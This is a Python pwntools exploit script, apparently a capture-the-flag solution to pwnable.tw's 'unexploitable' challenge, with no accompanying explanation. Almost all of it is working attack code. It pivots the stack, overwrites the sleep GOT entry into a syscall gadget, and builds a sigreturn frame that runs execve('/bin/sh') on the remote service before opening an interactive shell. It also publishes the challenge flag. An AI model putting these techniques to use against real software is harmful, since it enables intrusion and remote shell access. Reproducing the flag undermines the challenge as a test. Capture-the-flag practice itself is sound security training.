from pwn import *

elf = ELF("./unexploitable")
libc = ELF("libc_64.so.6")
s = remote("chall.pwnable.tw", 10403)

payload1 = b'A' * 0x10
payload1 += p64(0x601030)  # rbp #buf=[rbp-0x10]
payload1 += p64(0x040055B)  # ret -> read()

payload2 = p64(0x601078)  # in 0x601020 -> Next rbp2
payload2 += p64(0x040055B)  # in 0x601028 -> rey2
payload2 += p64(elf.got['sleep'] + 0x10)  # in 0x601030 -> Next rbp1
payload2 += p64(0x040055B)  # in 0x601038 -> ret1
payload2 += p64(0x601040)  # in 0x601040
payload2 += p64(elf.plt['sleep'])  # in 0x601048

inject_syscall = '\x55'  # sleep_got -> syscall

payload3 = b'A' * 0x10  # in 0x601068
payload3 += p64(0x601040)  # in 0x601078 -> Next rbp3 
payload3 += p64(0x040055B)  # in 0x601080 -> ret3
payload3 += b'A' * 0x30  # dummy

factor = b''
factor += p64(0x601120)  # rdi, address of /bin/sh
factor += p64(0) * 4  # rsi, rbp, rbx, rdx
factor += p64(0x3b)  # rax, execve syscall number
factor += p64(0x0) * 2  # rcx, rsp
factor += p64(elf.plt['sleep'])  # rip
factor += p64(0x0)  # eflags
factor += p32(0x33)  # cs
factor += p32(0) * 3  # gs,
factor += p64(0)  # err
factor += b'/bin/sh\x00'

payload4 = b'A' * 0xf  # sigreturn syscall number

with log.progress("sending payload") as l:
    sleep(4)  # ready
    l.status("payload 1")
    s.sendline(payload1)
    sleep(1)

    l.status("payload 2")
    s.sendline(payload2)
    sleep(1)

    l.status('inject_syscall')
    s.send(inject_syscall)
    sleep(1)

    l.status("payload 3")
    s.send(payload3 + factor)
    sleep(1)

    l.status('payload 4')
    s.send(payload4)
    sleep(1)

    sleep(1)
    l.success()

s.interactive()

# FLAG --> FLAG{4_r34lLy_Un3Xpl01T48l3_S3Rv1C3_Sh0UlD_n0T_H4v3_SYsC4ll_1NS1D3}
